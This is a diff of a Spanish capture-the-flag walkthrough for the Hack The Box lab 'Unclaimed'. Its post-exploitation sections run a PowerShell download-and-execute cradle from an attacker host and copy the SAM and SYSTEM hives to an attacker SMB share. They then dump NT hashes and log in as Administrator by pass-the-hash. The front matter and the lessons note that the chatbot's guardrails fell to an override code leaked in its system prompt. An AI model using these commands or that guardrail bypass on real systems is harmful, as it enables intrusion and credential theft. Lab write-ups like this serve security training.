@@ -7,6 +7,9 @@ os: "Windows"
 tags: [LLM, Prompt Injection, MSSQL, xp_cmdshell, Impersonation]
 excerpt: "Un chatbot que traduce lenguaje natural a SQL, guardrails que caen con un override code filtrado, impersonación de logins y xp_cmdshell hasta shell como svc_sql."
 featured: true
+repo: "https://github.com/marc-aliaga/HTB_labs/tree/main/LLM_Injection%20%2B%20SQLi"
+video: ""
+machine: "https://labs.hackthebox.com/achievement/machine/4228633/1012"
 ---
 
 # HTB · Unclaimed (Seasonal) — Walkthrough
@@ -232,24 +235,174 @@ user.txt → 3a261d989235945c3739485650046b80
 
 ## 8. Post-explotación — credenciales de `svc_wtbackup`
 
-Desde el shell de `svc_sql` se extraen las credenciales almacenadas en los *SQL Server Credentials* con `Get-MSSQLCredentialPasswords.psm1` (servido desde Kali en `:8000`):
+> **Nota:** a partir de aquí la VPN se reconectó y el objetivo pasó a `10.129.208.26`.
+
+Desde el shell de `svc_sql` ya se intuye que existe una **credencial almacenada** en el servidor SQL. Primero se listan los *SQL Server Credentials* con `sqlcmd` para ver qué hay:
 
 ```powershell
-IEX(New-Object Net.WebClient).DownloadString('http://10.10.15.220:8000/Get-MSSQLCredentialPasswords.psm1')
-Get-MSSQLCredentialPasswords | Format-List * | Out-File C:\Windows\Temp\cred.txt
+sqlcmd -S . -E -C -Q "SELECT name, credential_identity FROM sys.credentials" -o C:\Windows\Temp\cred.txt
 type C:\Windows\Temp\cred.txt
 ```
 
-![Get-MSSQLCredentialPasswords](/img/htb/unclaimed/Screenshot%202026-11-14%20084414.png)
+![sqlcmd sys.credentials](/img/htb/unclaimed/Screenshot%202026-11-15%20030922.png)
+![cred.txt consulta](/img/htb/unclaimed/Screenshot%202026-11-15%20032253.png)
+
+→ existe la credencial **`WTArchiveCred`** asociada a la identidad **`UNCLAIMED\svc_wtbackup`**… pero `sys.credentials` **no expone la contraseña**:
+
+![WTArchiveCred identity](/img/htb/unclaimed/Screenshot%202026-11-15%20032311.png)
+
+### Recuperar la contraseña del *credential*
+
+La contraseña de un *SQL Server Credential* se guarda cifrada reversible (DPAPI/service master key) y puede recuperarse con un login `sysadmin`. Se sirve un script desde Kali (`python3 -m http.server`) y se ejecuta en memoria contra el servidor:
+
+![ls Descargas + http.server](/img/htb/unclaimed/Screenshot%202026-11-15%20032432.png)
+
+```powershell
+# Descarga del módulo que define la función Obtenerpass / Get-MSSQLCredentialPasswords
+iwr http://10.10.15.220:8000/MSSQL_cred.psm1 -o C:\Windows\Temp\mssql.psm1
+```
+
+![iwr MSSQL_cred.psm1](/img/htb/unclaimed/Screenshot%202026-11-15%20033034.png)
+![function Obtenerpass](/img/htb/unclaimed/Screenshot%202026-11-15%20033050.png)
+
+```powershell
+IEX(New-Object Net.WebClient).DownloadString("http://10.10.15.220:800/MSSQL_cred.psm1"); Obtenerpass | Format-List * | Out-File C:\Windows\Temp\pass.txt
+type C:\Windows\Temp\pass.txt
+```
+
+![Obtenerpass → password](/img/htb/unclaimed/Screenshot%202026-11-15%20040838.png)
+
+También se confirma con `Get-MSSQLCredentialPasswords` (segunda ejecución del mismo ataque, para validar la contraseña):
+
+![Get-MSSQLCredentialPasswords](/img/htb/unclaimed/Screenshot%202026-11-15%20043543.png)
 
 ```
 Instance   : MSSQLSERVER
 Credential : WTArchiveCred
 User       : UNCLAIMED\svc_wtbackup
-Password   : W0rldTr@cer_
+Password   : W0rldTr@cer_B@ckup1
 ```
 
-➡️ **Siguiente paso:** usar `UNCLAIMED\svc_wtbackup : W0rldTr@cer_` como movimiento lateral (WinRM 47001 / SMB) hacia la ruta de privesc a Administrator / root flag.
+➡️ Credenciales recuperadas: **`UNCLAIMED\svc_wtbackup : W0rldTr@cer_B@ckup1`**.
+
+---
+
+## 9. Movimiento lateral → `svc_wtbackup` (WinRM)
+
+Validación rápida de las credenciales contra WinRM con `netexec` (`Pwn3d!` confirma acceso administrativo al servicio WinRM):
+
+```bash
+nxc winrm 10.129.208.26 -u svc_wtbackup -p 'W0rldTr@cer_B@ckup1' --local-auth
+```
+
+![nxc winrm Pwn3d](/img/htb/unclaimed/Screenshot%202026-11-15%20043753.png)
+
+Shell interactiva con **Evil-WinRM**:
+
+```bash
+evil-winrm -i unclaimed.htb -u 'svc_wtbackup' -p 'W0rldTr@cer_B@ckup1'
+```
+
+![evil-winrm conexión](/img/htb/unclaimed/Screenshot%202026-11-15%20043830.png)
+![evil-winrm prompt](/img/htb/unclaimed/Screenshot%202026-11-15%20043823.png)
+
+**Privilegios del nuevo usuario** — la clave del privesc:
+
+```powershell
+whoami /priv
+```
+
+![whoami /priv SeBackupPrivilege](/img/htb/unclaimed/Screenshot%202026-11-15%20043934.png)
+
+→ `svc_wtbackup` tiene **`SeBackupPrivilege`** y **`SeRestorePrivilege`** habilitados. Esto permite **leer cualquier archivo del sistema** (incluidos los *hives* protegidos del registro) ignorando las ACL → camino directo a volcar los hashes locales.
+
+---
+
+## 10. `SeBackupPrivilege` → volcado de `SAM` + `SYSTEM`
+
+El plan: copiar los hives `HKLM\SAM` y `HKLM\SYSTEM` con `reg save` (permitido gracias a `SeBackupPrivilege`), exfiltrarlos a Kali por SMB y extraer los hashes offline.
+
+```powershell
+mkdir C:\Temp
+```
+
+![mkdir C:\Temp](/img/htb/unclaimed/Screenshot%202026-11-15%20061657.png)
+
+Servidor SMB en Kali para recibir los ficheros:
+
+```bash
+impacket-smbserver share /tmp/share -smb2support -user a -password a
+```
+
+![impacket-smbserver](/img/htb/unclaimed/Screenshot%202026-11-15%20062116.png)
+
+Se guardan **`sam` y `system` por separado** con `reg save`:
+
+```powershell
+reg save hklm\sam    C:\Temp\sam.save    /y
+reg save hklm\system C:\Temp\system.save /y
+dir C:\Temp
+```
+
+![reg save correcto](/img/htb/unclaimed/Screenshot%202026-11-15%20063650.png)
+
+Los tamaños son coherentes — `system.save` ≈ 14 MB frente a los 77 KB del `sam.save`:
+
+![dir tamaños correctos](/img/htb/unclaimed/Screenshot%202026-11-15%20063707.png)
+
+```powershell
+copy C:\Temp\sam.save    \\10.10.15.220\share\sam.save
+copy C:\Temp\system.save \\10.10.15.220\share\system.save
+```
+
+![copy sam.save](/img/htb/unclaimed/Screenshot%202026-11-15%20063847.png)
+![ls -la /tmp/share correcto](/img/htb/unclaimed/Screenshot%202026-11-15%20063904.png)
+
+---
+
+## 11. `secretsdump` → hash del `Administrator`
+
+Con los dos hives correctos, `secretsdump` vuelca los hashes NT locales:
+
+```bash
+impacket-secretsdump -sam sam.save -system system.save LOCAL
+```
+
+![secretsdump OK](/img/htb/unclaimed/Screenshot%202026-11-15%20063922.png)
+![secretsdump OK (vista completa)](/img/htb/unclaimed/Screenshot%202026-11-15%20064008.png)
+
+```
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:459320e2885c6152b2c356d1dde397de:::
+svc_sql:1003:...:9646a5d7042372e7bf8931431685bfbf:::
+svc_wtbackup:1004:...:2399aba37e90add4778b9ff530e2afca:::
+svc_tracerbot:1005:...:8e41fa64d08a340e943aba6a851ff757:::
+p.hale:1006:...:8c8ee75665ac7dca2a5b9385e2fd2fbf:::
+```
+
+→ **hash NT del Administrator:** `459320e2885c6152b2c356d1dde397de`.
+
+---
+
+## 12. Pass-the-Hash → `Administrator` → **root flag**
+
+No hace falta crackear el hash: se autentica por **Pass-the-Hash** con Evil-WinRM:
+
+```bash
+evil-winrm -i 10.129.208.26 -u 'Administrator' -H '459320e2885c6152b2c356d1dde397de'
+```
+
+![evil-winrm PtH Administrator](/img/htb/unclaimed/Screenshot%202026-11-15%20064225.png)
+
+Shell como **`Administrator`** → la **root flag** está en su escritorio:
+
+```powershell
+dir C:\Users\Administrator\Desktop
+type C:\Users\Administrator\Desktop\root.txt
+```
+
+![root.txt en Desktop](/img/htb/unclaimed/Screenshot%202026-11-15%20064258.png)
+
+🏁 **Máquina comprometida por completo** (`Administrator` / `NT AUTHORITY\SYSTEM`).
 
 ---
 
@@ -264,7 +417,9 @@ Password   : W0rldTr@cer_
 | Contexto de RCE | `unclaimed\svc_sql` |
 | Tablas MSSQL | `Flights`, `Passengers`, `PIR`, `BagEvents` |
 | **user.txt** | `3a261d989235945c3739485650046b80` |
-| Credencial WTArchiveCred | `UNCLAIMED\svc_wtbackup : W0rldTr@cer_` |
+| Credencial WTArchiveCred | `UNCLAIMED\svc_wtbackup : W0rldTr@cer_B@ckup1` |
+| Privilegios de `svc_wtbackup` | `SeBackupPrivilege`, `SeRestorePrivilege` |
+| **Hash NT Administrator** | `459320e2885c6152b2c356d1dde397de` |
 
 ---
 
@@ -274,3 +429,6 @@ Password   : W0rldTr@cer_
 - Los guardrails del modelo **no son un control de seguridad**: un *override code* filtrado en el propio *system prompt* los anula por completo.
 - En MSSQL, `IMPERSONATE` + un login con privilegios = `EXECUTE AS LOGIN` → `xp_cmdshell` → RCE.
 - Codificar los payloads de PowerShell en Base64 (`-enc`) evita los *500* por comillas al pasar por el JSON del chatbot.
+- Las **credenciales de SQL Server** (`sys.credentials`) guardan el usuario pero no la contraseña; con un login `sysadmin` la contraseña cifrada es **recuperable**.
+- **`SeBackupPrivilege`** permite leer los hives `SAM`/`SYSTEM` saltándose las ACL → volcado offline de hashes → **Pass-the-Hash** a `Administrator`, sin necesidad de crackear nada.
+- Cuidado al guardar los hives: si se copia `hklm\sam` dos veces, `secretsdump` falla con `'NoneType' object is not subscriptable`. El **tamaño** del fichero (`SYSTEM` ≫ `SAM`) delata el error.
